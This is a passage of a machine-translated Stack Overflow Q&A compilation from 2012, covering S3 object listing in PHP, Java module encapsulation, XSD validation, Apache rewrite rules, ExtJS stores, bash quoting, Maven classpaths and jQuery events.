您需要知道该`list_objects`功能有限制。它不允许加载超过 1000 个对象，即使`max-keys`选项将设置为某个较大的数字。

要解决此问题，您需要多次加载数据：

```
private function _getBucketObjects($prefix = '', $booOneLevelOny = false)
{
    $objects = array();
    $lastKey = null;
    do {
        $args = array();
        if (isset($lastKey)) {
            $args['marker'] = $lastKey;
        }

        if (strlen($prefix)) {
            $args['prefix'] = $prefix;
        }

        if($booOneLevelOny) {
            $args['delimiter'] = '/';
        }

        $res = $this->_client->list_objects($this->_bucket, $args);
        if (!$res->isOK()) {
            return null;
        }

        foreach ($res->body->Contents as $object) {
            $objects[] = $object;
            $lastKey = (string)$object->Key;
        }
        $isTruncated = (string)$res->body->IsTruncated;
        unset($res);
    } while ($isTruncated == 'true');

    return $objects;
} 
```

结果 - 您将获得对象的完整列表。

* * *

如果您有一些自定义标题怎么办？它们不会通过`list_objects`函数返回。在这种情况下，这将有所帮助：

```
foreach (array_chunk($arrObjects, 1000) as $object_set) {
    $batch = new CFBatchRequest();
    foreach ($object_set as $object) {
        if(!$this->isFolder((string)$object->Key)) {
            $this->_client->batch($batch)->get_object_headers($this->_bucket, $this->preparePath((string)$object->Key));
        }
    }

    $response = $this->_client->batch($batch)->send();

    if ($response->areOK()) {
        foreach ($response as $arrHeaderInfo) {
            $arrHeaders[] = $arrHeaderInfo->header;
        }
    }
    unset($batch, $response);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-20T04:49:48.940

我最终使用了[list_objects](http://docs.amazonwebservices.com/AWSSDKforPHP/latest/#m=AmazonS3/list_objects)函数，该函数提取了我需要的 LastModified 元数据。

一次通话:)

# java - 如何在 Java 中的两个包之间共享包私有数据？

> ID：10989881
> 
> 赞同：6
> 
> 时间：2012-06-12T02:30:48.943
> 
> 标签：java, package, share, encapsulation, package-private

我有 2 个 Java 包，A 和 B。假设包 B 中的某些类想要使用包 A 中的某些类，但是，当开发人员出现并开发包 C（或者说，应用程序 C）时，他/她将使用我的包 B，但我*不*希望他/她能够使用 B 正在使用的 A 中的类。也就是说，我希望我在包 A 中的类是包私有的，以便对应用程序开发人员隐藏它们。但是，我*确实*希望我自己的包 B 能够访问那些包私有的类。这可以用Java完成吗？我是否基本上只需要硬着头皮将课程公开并希望用户不要尝试使用它们？或者，我是否需要在 B 中复制 A 中的类？

我的偏好不会是hack-y（即我不想使用反射）。帮助？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-12T02:54:15.953

您可以使用[JDK 8](http://jdk8.java.net/jigsaw/)及其[Project Jigsaw](http://cr.openjdk.java.net/~mr/jigsaw/notes/jigsaw-big-picture-01)来实现。您可能想看看[Project Jigsaw 快速入门指南](http://openjdk.java.net/projects/jigsaw/doc/quickstart.html)。

不幸的是，Jigsaw 是 JDK8 的一部分，它还没有完全准备好。它预计要[到 2013 年 1 月](http://mail.openjdk.java.net/pipermail/jdk8-dev/2012-April/000942.html)才能完成功能，并且不会在 2013 年年中之前发布。

但是，您已经可以使用 JDK 8 预览版编译您的类并使您的想法生效。

在这种情况下，您的问题可以通过将您的应用程序划分为独立的模块来解决。您可以执行以下操作：

```
module foo {
    exports foo;
    permits bar;
    permits baz;
} 
```

这里只有名为 bar 或 baz 的模块需要模块 foo。某个其他名称的模块对 foo 的依赖在编译时、安装时或运行时将无法解决。如果不存在许可条款，则不存在此类约束。

不确定像[OSGI这样的替代框架（您可以在](http://en.wikipedia.org/wiki/OSGi)[Apache Felix](http://felix.apache.org/site/index.html)和[Eclipse Equinox](http://www.eclipse.org/equinox/)中找到实现）是否提供某种功能来实现这些级别的封装。您可能想对此进行一些调查。

[没有 Jigsaw 的OSGi](http://en.wikipedia.org/wiki/OSGi)的问题在于，框架强制执行的任何规则都可以通过反射来破坏，但是一旦 Jigsaw 准备好供公众使用，这些规则将由 Java 本身强制执行，正如您在上面阅读的那样，在编译时，运行时间和安装时间。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-14T10:34:20.983

您可以使用 OSGi 做到这一点。在这种情况下，作为目标的 Android 和 JDK 6 不是问题，在 Android 上运行 OSGi 框架 -> 例如参见[mBedded Server for Android](http://www.prosyst.com/index.php/de/html/content/49/mBS-Mobile-for-Android/)。您可以从该链接下载免费的非商业版本。

您有多种选择如何在 OSGi 中执行此操作，具体取决于您想要实现的目标。

选项 1（推荐）：您可以将包 A 和 B 放在同一个包 AB 中，并使用 Export-Package 仅导出此包清单中的包 B。包/应用程序 C 或任何其他“用户”应用程序可以导入包 B 并使用它。它不能使用，甚至看不到包 A，因为它是包 AB 的内部。您不需要任何 Java 级别的特殊声明或依赖项；这适用于任何 Jva 版本，因为模块化和单独的捆绑空间是 OSGi 基础的一部分，并且不依赖于最新的 Java 版本或其他东西。

选项 2：如果出于某种原因您希望将包 A 和 B 分隔在不同的包中，您可以让它们如此，您将在清单中导出和导入包，然后使用权限控制哪个包有权导入哪个包（请参阅 OSGi 权限和条件权限服务）。然而，这实现起来比较复杂。

选项 3：您也可以将包 A 放在 Fragment 包中，并允许它附加到包含 B 的包。这样 B 将可以访问包 A，但同时您可以单独更新包 A如果需要，在运行时。由于片段中的包被视为主机包的私有包（在这种情况下，主机是包含包 B 的包），包 C 不会看到 A。它只会看到包 B 导出的内容。

由于您对 OSGi 不太熟悉，因此我建议您先使用选项 1，然后如果需要，您可以稍后将您的方法升级到选项 3。

@Edwin Dalorzo：OSGi 中的规则可以通过反射来破坏，这绝对不是真的。Bundle 在 OSGi 中有单独的类加载器。您可以从 Bundle C 中尽可能多地反映 A 类，而您唯一会得到的是 ClassNotFound 异常 - 相信我，我已经看过很多次了；）

# jquery - 设置 Django 表单 html id

> ID：10989884
> 
> 赞同：1
> 
> 时间：2012-06-12T02:31:13.350
> 
> 标签：jquery, html, django, forms

我修改了 django 评论表单，发现它没有输出 html id。如何在整个表单中添加 html id？

我需要 id 以便我可以在 jQuery 中获取单选的值。

**编辑：** 我在下面尝试了 Matthew Schinckel 的方法：

```
var output = $("input[name=rating]:checked").val();
$('#some_div').text(output).fadeIn(500); 
```

这不返回任何内容。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T02:41:56.953

Django 确实将每个表单元素的 id 放入其中。您也许可以在 jQuery 中使用它。或者，按照 okm 的建议，使用该`name`属性。

```
$('input[name=radioName]:checked').val() 
```

或者，使用 django 的默认命名：

```
$('#id_radioName').val() 
```

（如果您的页面上有多个表单/表单集，则 id 可能会有所不同）。

# xsd - 在枚举列表上实现 XOR

> ID：10989885
> 
> 赞同：0
> 
> 时间：2012-06-12T02:31:46.273
> 
> 标签：xsd, xor, xsd-validation

说明我的问题的最好方法是发布`xsd`我目前拥有的一些片段；它会让你更容易理解我的问题。

`xsd`这是我当前文件的一些片段：

```
<xs:element name="RiskAnalysis">
<xs:complexType>
  <xs:sequence>        
    <xs:element ref="RiskRating" maxOccurs="unbounded"/>
  </xs:sequence>
...
...
</xs:complexType>
</xs:element>

<xs:element name="RiskRating">
 <xs:complexType>
     ...
  <xs:attribute name="RatingType" use="required">
 <xs:simpleType>
      <xs:restriction base="xs:NMTOKEN">
        <xs:enumeration value="LocationNeighbourhood"/>
        <xs:enumeration value="Land"/>
        <xs:enumeration value="Improvements"/>
        <xs:enumeration value="Environmental"/>
        <xs:enumeration value="MarketSegment"/>
        <xs:enumeration value="ReducedValue"/>
        <xs:enumeration value="RecentMarket"/>           
        <xs:enumeration value="LocalEconomy"/>
        <xs:enumeration value="MarketVolatility"/>
        <xs:enumeration value="Other"/>
      </xs:restriction>
    </xs:simpleType>
  </xs:attribute>
...
 </xs:complexType>
</xs:element> 
```

我遇到的问题是我需要限制我的方法，以便为is和的元素之间`xsd`创建一个 XOR ，但我想不出一种方法来做到这一点。`RiskRatings``RatingType``ReducedValue``RecentMarketValue`

最好通过示例来描述，因此这里有一些示例`RiskAnalysis`元素（在`xsd`伪代码中）我可能会收到：

可接受的（即既不是也不是`ReducedValue`传入`RecentMarket`）：

```
<RiskAnalysis>
     <RiskRating RatingType="Land" />
     <RiskRating RatingType="Other" />
</RiskAnalysis> 
```

可接受（即仅`ReducedValue`传入）：

```
<RiskAnalysis>
     <RiskRating RatingType="Land" />
     <RiskRating RatingType="Other" />
     <RiskRating RatingType="ReducedValue" />
</RiskAnalysis> 
```

可接受（即仅`RecentMarket`传入）：

```
<RiskAnalysis>
     <RiskRating RatingType="Land" />
     <RiskRating RatingType="Other" />
     <RiskRating RatingType="RecentMarket" />
</RiskAnalysis> 
```

不接受并且应该抛出模式验证错误（即两者 `RecentMarket`并`ReducedValue`传入）：

```
<RiskAnalysis>
     <RiskRating RatingType="Land" />
     <RiskRating RatingType="Other" />
     <RiskRating RatingType="RecentMarket" />
     <RiskRating RatingType="ReducedValue" />
</RiskAnalysis> 
```

有人知道我会怎么做吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T12:43:58.223

XSD（单独）不可能！

解决方案：您许多人只需要使用主机代码来评估这部分。调用 XSD 验证（如 C#、CPP、JAVA 等）的主机程序能够验证这些条件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-09T17:48:59.163

The simplest way would be to eliminate the inconsistency in the analysis of your domain implicit in your schema: on the one hand, you want risk ratings of type RecentMarket and of type ReducedValue to be treated differently for purposes of validation, while on the other hand you are giving them the same element type, which says implicitly that for purposes validation they should be treated the same. The same? or different? Choose.

Given element types RecentMarketRating, ReducedValueRating, and OtherRiskRating, it's trivial to solve your problem. Given an XML encoding which calls them all the same thing, you main options are non-XSD code to do the validation, XSD 1.1 and the use of conditional type assignment or assertions, or Schematron in addition to your XSD 1.0\.

# apache - Apache mod 重写规则

> ID：10989886
> 
> 赞同：0
> 
> 时间：2012-06-12T02:31:46.327
> 
> 标签：apache

我们需要根据用户代理将用户重定向到移动网站或普通网站。
我正在尝试在我的 http.conf 文件中编写以下代码，但它似乎不起作用。有人可以指出我的错误吗？

```
RewriteCond %{HTTP_USER_AGENT} "android|blackberry|googlebot-mobile|iemobile|ipad|iphone|ipod|opera mobile|palmos|webos" [NC]
RewriteRule ^/shop/website ^/shop/mobile [L,R=302]

```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T03:29:00.957

下面的代码（从重定向目标中删除了一个虚假的插入符号，以及显式的 302 代码）在 httpd.conf 中对我有用，但如果你将它放在一个 .htaccess 文件中，你需要更改它：

```
RewriteCond %{HTTP_USER_AGENT} "android|blackberry|googlebot-mobile|iemobile|ipad|iphone|ipod|opera mobile|palmos|webos" [NC]
RewriteRule ^/foo.txt /bar.txt [L,R] 
```

（如果您将其放入 .htaccess 文件中，您将删除目录规范，因为您会将其放入目录上下文中：

```
RewriteCond %{HTTP_USER_AGENT} "android|blackberry|googlebot-mobile|iemobile|ipad|iphone|ipod|opera mobile|palmos|webos" [NC]
RewriteRule foo.txt bar.txt [L,R] 
```

我相信您可以删除显式 302 重定向代码，因为 302 是默认值。

# javascript - forge.tabbar 是如何工作的？记录的示例不起作用

> ID：10989887
> 
> 赞同：2
> 
> 时间：2012-06-12T02:31:56.367
> 
> 标签：javascript, trigger.io, forge

我有一个标准的 Forge 生成的[Trigger.io](http://trigger.io)应用程序，我制作了一个单独的应用程序来测试它。

我将“tabbar：true”添加到 config.json，将名为“pencil@2x.png”的图像复制到“/img”目录，并在所有其他文件中保留其他所有内容。同样在“default.js”中，我有：

```
forge.enableDebug();
forge.tabbar.addButton({
  icon: "img/pencil@2x.png",
  text: "Pencil"
}, function (button) {
  button.setActive();
  button.onPressed.addListener(function () {
    alert("My Stories");
  });
}, alert('Error')); 
```

*注意：[这里](http://docs.trigger.io/en/v1.3/faq.html#faq)的文档已经过时了，它应该说“forge.enableDebug();”，而不是“window.forge.debug = true;”*

我在 Catalyst 中没有得到任何输出，但我收到“错误”警报，并且我的控制台显示：

```
[   INFO] Showing log output:
2012-06-11 21:14:41.759 ios-sim-xc4.3[90599:507] stderrPath: /var/folders/d_/b7n2d1qn23z7zx2gfmhh22d80000gp/T/tmpsCqHJK
[   INFO] 2012-06-11 21:14:42.827 Forge[90605:1a603] [INFO] Device rotated.
[   INFO] 2012-06-11 21:14:42.844 Forge[90605:1a603] [INFO] Loading default page in webview.
[   INFO] 2012-06-11 21:14:42.850 Forge[90605:1a603] [INFO] Device rotated.
[   INFO] 2012-06-11 21:14:42.851 Forge[90605:1a603] [INFO] Device rotated.
[   INFO] 2012-06-11 21:14:42.861 Forge[90605:1a603] [INFO] Loading local url in webview: file:///Users/Name/Library/Application%20Support/iPhone%20Simulator/5.1/Applications/82F1256F-C533-4CD7-864B-74545EAE346A/simulator-ios.app/assets/src/index.html
[   INFO] 2012-06-11 21:14:49.518 Forge[90605:1a603] -[JKArray isEqualToString:]: unrecognized selector sent to instance 0x8fe30e0
[   INFO] 2012-06-11 21:14:49.519 Forge[90605:1a603] *** WebKit discarded an uncaught exception in the webView:decidePolicyForNavigationAction:request:frame:decisionListener: delegate: <NSInvalidArgumentException> -[JKArray isEqualToString:]: unrecognized selector sent to instance 0x8fe30e0 
```

标签栏出现了，但上面没有按钮。

为什么我会收到这些错误，我该如何解决。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T13:36:10.060

首先，感谢您指出过时的常见问题解答条目 - 我已经相应地更新了我们的文档。

我已经尝试了您粘贴的代码片段，一切都按预期工作：当我单击按钮时，我会收到“我的故事”警报。

**注意**：如果出现问题，我认为您正在尝试显示错误警报？为此，请将错误回调更改为：

```
function (err) { alert('Error'); } 
```

由于我无法从您的代码段重新创建，如果您仍然遇到问题，请将您的 src 目录的 zip 发送到 support@trigger.io，我们很乐意再看看这个！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T12:53:06.257

“发送到实例 0x8fe30e0 的无法识别的选择器”对我来说听起来就像你的图像名称中的“@”符号把事情搞砸了。

# javascript - ExtJs4 MVC，组合框的data.store

> ID：10989897
> 
> 赞同：0
> 
> 时间：2012-06-12T02:34:00.843
> 
> 标签：javascript, model-view-controller, extjs4

我想定义存储companyList的data.store，因为我想稍后重用这个存储。

```
tbar: Ext.create('Ext.Toolbar', {
    items: [
        {
        xtype : 'combo',
        name : 'companyCode',
        editable : false,
        valueField : 'companyCode',
        displayField : 'companyName',
        triggerAction : 'all',
        store: Ext.create('Ext.data.Store', {
                fields: ['companyCode', 'companyName'],
                proxy: {
                type: 'ajax', 
                url: '/Reports/GetCompanyList/',
                reader: 'json',
                actionMethods: {
                    read: 'POST'
                }
                },
                autoLoad:true  
            }) 
```

上面的代码是可行的，我想把商店放到app文件夹下的我的商店文件夹中。

商店/CompanyList_store.js

```
Ext.define('App.store.CompanyList_store', {
    extend: "Ext.data.Store",
    fields: ['companyCode', 'companyName'],
    proxy: {
        type: 'ajax',
        url: '/Reports/GetCompanyList/',
        reader: 'json',
        actionMethods: {
            read: 'POST'
        }
    },
    autoLoad: true  
}); 
```

我在控制器中添加了这个商店。

```
Ext.define("App.controller.InventoryReport", {
    extend: "Ext.app.Controller",
    stores: ['Inventory_store', 'CompanyList_store'],
    .
    . 
```

并将此商店添加到组合框商店，

```
tbar: Ext.create('Ext.Toolbar', {
    items: [
        {
        xtype : 'combo',
        name : 'companyCode',
        editable : false,
        valueField : 'companyCode',
        displayField : 'companyName',
        triggerAction : 'all',
        store: 'CompanyList_store' //it does not work. 
```

我做错了什么？如果有人知道，请给我建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T07:09:16.047

必须将商店的 storeId 属性设置为您从组合中调用的值

[http://docs.sencha.com/ext-js/4-1/#!/api/Ext.data.AbstractStore-cfg-storeId](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.data.AbstractStore-cfg-storeId)

但在现实生活中，我建议使用 Deft 的依赖注入。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T12:26:54.630

我认为您忘记在应用程序文件中包含所有商店。

它应该是这样的：

```
Ext.application({
  appFolder: ...
  controllers: [your controllers here],
  stores: [your stores here]
}); 
```

如果您将商店放在不同的文件夹中（以在 ext 应用程序之间共享它们），请确保包含以下内容 `Ext.Loader.setPath([namespace], [path to the folder with stores]`：）

# linux - Linux命令行上双引号字符串内的单引号

> ID：10989899
> 
> 赞同：3
> 
> 时间：2012-06-12T02:34:23.520
> 
> 标签：linux, shell, escaping

我有以下命令

```
cmd '"asdf" "a'sdf"' 
```

我只需要用单引号将参数括起来。由于某种我不知道的原因，cmd 不能使用双引号。上面的命令不起作用，因为中间的单引号终止了第一个单引号。如果我逃跑，到以下

```
cmd '"asdf" "a\'sdf"' 
```

它仍然不起作用。我如何让这个工作？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T02:43:23.990

根据 bash 手册页：

```
 Enclosing  characters in single quotes preserves the literal value
   of each character within the quotes.  A single quote may not occur
   between single quotes, even when preceded by a backslash. 
```

所以答案是，无论您如何尝试，都不能在单引号字符串中包含单引号。但是根据脚本的设置方式，您可以使用`'\''`，这将结束第一个单引号，转义第二个，并以第三个单引号开始另一个单引号字符串。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T02:46:13.990

很久很久以前，一位导师建议我使用`'"asdf" "a'"'"'sdf"'`. 它有效，但看起来很奇怪。

由于您不能将单引号放在单引号内，因此将它们转义`'"asdf" "a'\''sdf'`可能是要走的路。

请注意，您还可以`printf`交互地或在 shell 脚本中使用和变量。对于大多数 shell（您尚未指定要使用的内容），您应该得到与此类似的结果：

```
$ fmt='"asdf" "a%ssdf"\n'
$ printf "$fmt" "'"
"asdf" "a'sdf"
$ 
```

或者您甚至可以使用其 ASCII 值包含单引号：

```
$ fmt='"asdf" "a\047sdf"\n'
$ printf "$fmt"
"asdf" "a'sdf"
$ 
```

或在 csh 中：

```
% set fmt='"asdf" "a\047sdf"\n'
% printf "$fmt"
"asdf" "a'sdf"
% 
```

这是独立于 shell 的，因为如果你的 shell 没有`printf`内置命令（如 Bash 那样），那么该命令很可能作为单独的二进制文件存在于 /bin 或 /usr/bin 中。

我不知道你的用例，所以很难想出一个我知道会适用的解决方案。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-10-16T15:29:42.220

好吧，您始终可以使用自动完成功能来帮助您找到答案。

例如，如果我有一个带有撇号的文件，但我想用单引号括住路径，我可以这样做（使用`cat`文件名为的示例命令`sam's file.txt`）：

```
cat 'sam[press tab here] 
```

对我来说，它会自动完成：

```
cat 'sam'\''s\ file.txt 
```

所以，显然这是可能的。另一位回答者首先提到了这`'\''`件事，但我想我会告诉你一种方法来尝试找出它是否不适合你（我想我会成为另一个证人来告诉你另一个答案似乎有效）。

# asp.net - css链接不能从asp.net代码后面调用变量？

> ID：10989902
> 
> 赞同：0
> 
> 时间：2012-06-12T02:34:49.573
> 
> 标签：asp.net

我用aspx这样写：

```
<link type="text/css" href='/theme<%=theme%>/top.css' rel="stylesheet" /> 
```

但结果是这样的：

```
<link type="text/css" href="/theme&lt;%=theme%>/top.css" rel="stylesheet" /> 
```

令人惊讶的是，在js中使用是没有问题的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T02:46:20.067

这是因为您`link`位于`<head>`运行服务器的标签内。head 标签是“智能的”，因为当它看到一个`<link>`标签时，它可以让你实际使用应用程序的相对路径语法：~/. 因此，如果您这样做（在您的 head 标签内）：

```
<link href="~/Content/Site.css" rel="stylesheet" /> 
```

您会看到它实际上会起作用（也就是说，它会将波浪号扩展到您站点的正确位置），即使您在任何地方都没有说 runat server。当然，*不利*的一面是当您不希望它这样做时。:) 可能最简单的解决方案是自己手动构建标签，如下所示：

```
<%= "<link type=\"text/css\" href='/theme" + theme + "/top.css' rel=\"stylesheet\" />" %> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T02:59:27.857

您不能使用表达式，`<head runat="server">`而是必须在 Page_Load 事件中编写以下代码才能插入`<link/>`

```
HtmlLink link = new HtmlLink();
link.Attributes.Add("type", "text/css");
link.Attributes.Add("rel", "Stylesheet");
link.Attributes.Add("href", "/theme" + theme + "/top.css");
Header.Controls.Add(link); 
```

# android - facebook 在 Android 上发送消息

> ID：10989904
> 
> 赞同：2
> 
> 时间：2012-06-12T02:35:11.757
> 
> 标签：android, facebook

我还没有找到用于向已登录用户的朋友发送私人消息的 Facebook API。我想用这样的[东西](http://developers.facebook.com/docs/reference/dialogs/send/)

但是在手机浏览器中调用这个对话框并不是很好的用户体验。

它们是我可以用来向 Facebook 朋友发送消息的 API 吗？或者是否有计划支持 Android 上的发送对话框？

# opengl - SDL和OpenGL有什么关系？

> ID：10989907
> 
> 赞同：0
> 
> 时间：2012-06-12T02:35:40.790
> 
> 标签：opengl, sdl

任何人都可以告诉我 SDL 库和 OpenGL 库之间的关系是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T02:41:44.153

*OpenGL*是一个图形库，除了绘图之外不提供任何功能。它既不能在任何现代操作系统的窗口中嵌入 OpenGL 视图。

这就是*SDL 应运而生*的地方，它提供了以跨平台方式创建 OpenGL 窗口所需的所有功能，然后您可以使用 OpenGL 库本身进行绘制。*SDL*还拥有许多在使用游戏或图形应用程序（如计时器、键盘和鼠标管理等）时几乎总是必需的工具。

在任何情况下，您都可以使用任何其他 OpenGL 包装器（如*GLUT*库或*GLFW）*来实现相同的目的：在应用程序中创建 OpenGL 视图。

# java - How high is Java web application memory & CPU usage compared with PHP 5.4

> ID：10989909
> 
> 赞同：1
> 
> 时间：2012-06-12T02:35:48.740
> 
> 标签：java, php, web-frameworks

I have zero experience building website with Java. Recently I need to develop complex web application.

Currently I'm converting PHP apps to get it works in PHP 5.4\. With modern website requirement, PHP application needs better frameworking from start. Use Zend framework or Drupal 7 looks good move.

But Zend or Drupal 7 comes with a price. 300MB VPS seems not relevant anymore for an average PHP website. In this case, Resource usage rate is very important to me.

Because lots of complex web application is built with Java web framework, I just wonder how high is Java resource usage (memory & CPU) compared with PHP 5.4?

I hope it will be same or even better, so that I have more choice.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T02:44:01.360

[This](http://benchmarksgame.alioth.debian.org/u32/compare.php?lang=php&lang2=java) should provide some info about resource and cpu usage of both languages

![enter image description here](../Images/526d31cac7c7d3d9420e33b4167476e6.png)

Basically, based in that series of test (and until this date) Java memory consumption is in average bigger than PHP, but execution time tends to be faster

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-12T02:55:33.870

Overall memory usage will depend much more upon **what frameworks you use** and **how well you code your application** than whether you write it in PHP or Java. The baseline memory cost of both is small enough that you can ignore it on modern machines, so it is the application that matters.

In terms of CPU usage, **Java will ultimately perform much better** since it is JIT-compiled to native code and has an efficient statically typed in-memory object representation ([This benchmark](http://benchmarksgame.alioth.debian.org/u64q/which-programs-are-fastest.html) shows Java as over 25x than PHP on a set of benchmark programs)

Having said that, either would be probably be fine for most normal web applications. My advice would be:

*   Given you are familiar with PHP you may want to stick with it simply because the learning curve of picking up a new language and associated frameworks is significant.
*   If you are serious about developing a robust, high performance enterprise-grade application then it would certainly be worth learning and using Java. But you have to be sure that you are prepared to face a big learning curve.

Some interesting links:

*   [JVM memory usage for selected application servers](http://www.jvmhost.com/articles/memory-usage-comparison-of-java-application-servers-and-applications) - shows a baseline memory overhead in the range of 25-100mb for some common Java application servers

# javascript - 使用 nivoSlider 没有效果

> ID：10989910
> 
> 赞同：-1
> 
> 时间：2012-06-12T02:35:49.537
> 
> 标签：javascript, slider, nivo-slider

Nivo 滑块工作正常，但没有任何效果。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T02:54:12.487

它是一个 z-index 问题，在 nivo-slider.css:18

```
.nivoSlider img {
...
    z-index: 50;
} 
```

这是覆盖动画，删除它，你会看到过渡。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T02:54:33.120

首先，您需要在`<script>`标签内提供`<head>`标签。

```
<!-- Javascripts -->
<script src="http://ipmgroup.org/wp-content/themes/ipmgroup/scripts/jquery-1.7.1.min.js"></script>
<script src="http://ipmgroup.org/wp-content/themes/ipmgroup/scripts/jquery.nivo.slider.js"></script>    
<script src="http://ipmgroup.org/wp-content/themes/ipmgroup/scripts/ipm.main.js"></script> 
```

尝试更改它并检查。最后，CSS部分：

```
// Need more z-index from default
//Line Number 45!
.nivo-slice {z-index: 100;}
//Line Number 18!
.nivoSlider img {z-index: 10;} 
```

试试这个，它的工作原理！:)

# bash - bash 脚本应如何确定 maven 项目及其依赖项的类路径？

> ID：10989912
> 
> 赞同：5
> 
> 时间：2012-06-12T02:36:31.170
> 
> 标签：bash, maven, classpath

耶，我的论文写完了！现在压力已经消除，我已经玩够了 Skyrim，我正在将我为论文编写的代码从一个用 ant 构建的混乱目录转换为一个不错的 maven 项目。

我最初有一个`bin`包含大约 20 个 bash 脚本的目录，这些脚本运行我论文中使用的各种 java 和 ruby​​ 程序，包括最终的基于 jruby/sinatra 的 Web 服务器。我计划将我的脚本移动到`src/main/scripts`，但我需要弄清楚如何处理类路径。

我以前只是在我的脚本中将路径硬编码到手动下载的依赖项。但是，既然 Maven 正在下载和存储我需要的所有 jar，那么从我的脚本中引用它们的最佳方法是什么：

*   我应该像以前一样让脚本引用本地存储库中各种 jar 的完整路径吗？
*   我应该使本地存储库目录成为我的脚本的配置选项并使用该目录的相对路径吗？
*   [我应该使用maven 程序集插件](http://maven.apache.org/plugins/maven-assembly-plugin/)构建一个包含所有依赖项的大毛 jar并通过脚本相对路径访问它`../../../target/*-jar-with-dependencies.jar`吗？
*   有没有我没有想到的更好的选择？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T07:00:22.800

在您的脚本中，使用`exec:java`插件运行 Java 类。它将根据定义的依赖关系整理类路径。那你就不用担心了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T13:11:39.413

重新查看您拥有的所有脚本。[潜在地，您可以使用maven exec plugin](http://mojo.codehaus.org/exec-maven-plugin/)实现其中一些功能。

除了汇编和阴影插件之外，您可能还想查看[maven 依赖插件](http://maven.apache.org/plugins/maven-dependency-plugin/)提供的功能。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-20T17:14:02.530

在我的项目（**[Soluvas fb-tools/fbcli](https://github.com/soluvas/fb-tools)**）中，因为我使用 Java 6 及更高版本（支持[通配符类路径](http://docs.oracle.com/javase/6/docs/technotes/tools/windows/classpath.html)），所以我这样做：

```
#!/bin/bash                                                                                
# Must run first: mvn package dependency:copy-dependencies                                 
java -cp 'target/dependency/*:target/fbcli-1.0.0-SNAPSHOT.jar' org.jboss.weld.environment.se.StartMain "$@" 
```

无需手动生成类路径。:)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-12T07:24:00.980

有很多插件在做你提到的类似的事情。您提到的组装插件无疑是其中之一（您建议的方式也是一种简洁的工作解决方案）。

您可能想看看[AppAssembler](http://mojo.codehaus.org/appassembler/appassembler-maven-plugin/ "应用程序汇编器")和[Shade](http://maven.apache.org/plugins/maven-shade-plugin/ "阴影")。它们都提供了一些机制来捆绑依赖项并生成直接可执行的包。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2022-02-04T10:21:36.333

`exec:java`这是@artbristol 在另一条评论中提到的使用 Maven 插件的 CLI 示例：

```
mvn exec:java -Dexec.mainClass="mypackage.MyClassWithMain" -Dexec.args="arg1 arg2" 
```

# jquery - jQuery - 元素位置更改时的 Mouseenter

> ID：10989921
> 
> 赞同：2
> 
> 时间：2012-06-12T02:37:30.423
> 
> 标签：jquery, mouseevent

考虑以下代码（[此处](http://jsfiddle.net/7zEZw/)为 jsfiddle ）

```
<span class="content">foo</span><span class="closeButton">close</span>
<span class="content">bar</span><span class="closeButton">close</span>​

.content { padding: 0 4em; }
.closeButton:hover { display:inline; }
.closeButton {
    display: none;
    position: relative;
    left: -3em;
}

​$('.content').on('mouseenter', function() {
    $(this).next().css('display', 'inline');
}).on('mouseleave', function() {
    $(this).next().css('display', '');    
});
$('.closeButton').on('click', function() {
    $(this).prev().remove().end().remove();
});
​ 
```

当您将鼠标悬停在元素 'foo' 上时，使用 jQuery 'mouseenter' 事件会出现 closeButton。当您单击关闭按钮时，“foo”被删除，这导致元素“bar”在鼠标的当前位置下移动。但是，在您再次移动鼠标之前，不会为 'bar' 触发 'mouseenter' 事件。

有没有一种好方法可以让“酒吧”立即收到这个事件？

考虑到在这种情况下，您可以通过简单地重复单击来删除多个元素。在两次点击之间抖动鼠标是一种糟糕的用户体验。

我知道有几个附近的 anwsers 在我的情况下不起作用。

1) closeButton 元素实际上并不包含在它关闭的 'foo' 元素内。这是避免与页面上的其他脚本冲突并防止使用 css :hover 最初显示按钮所必需的，这将起作用[jsfiddle](http://jsfiddle.net/PLZJx/)。:(

2）我对DOMMutationEvents、它们的弃用以及相对缺乏支持有一些了解，我想避免它们以及模拟它们的各种计时器黑客等。我希望这个问题足够具体（鼠标位置相关事件) 在文档重排并修改鼠标目标时触发。特别是因为显然 CSS 引擎知道它并正确处理它。

3) 我正在使用 jQuery 来修改页面。当我调用“remove()”时，我可以对其进行修补以触发一个事件，并确保我“正确”了所有其他事件。这可以工作，但删除可能会影响 DOM 的很大一部分，因此很难将任何上下文真正传递给处理程序。结果，我将不得不做很多额外的工作，而不仅仅是为鼠标下的一个元素处理一个事件。这现在可能有效，但以后无法管理。

感谢您的任何建议。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T02:48:06.097

有一个漂亮的方法叫做 document.elementFromPoint(event.pageX, event.pageY)

你会在这里看到我是如何在 JSfiddle 上使用它的 :) [http://jsfiddle.net/7zEZw/1/](http://jsfiddle.net/7zEZw/1/)

# xml-parsing - 如何在 SAX 解析器中使用带有 in 数据的标签来解析 XML？

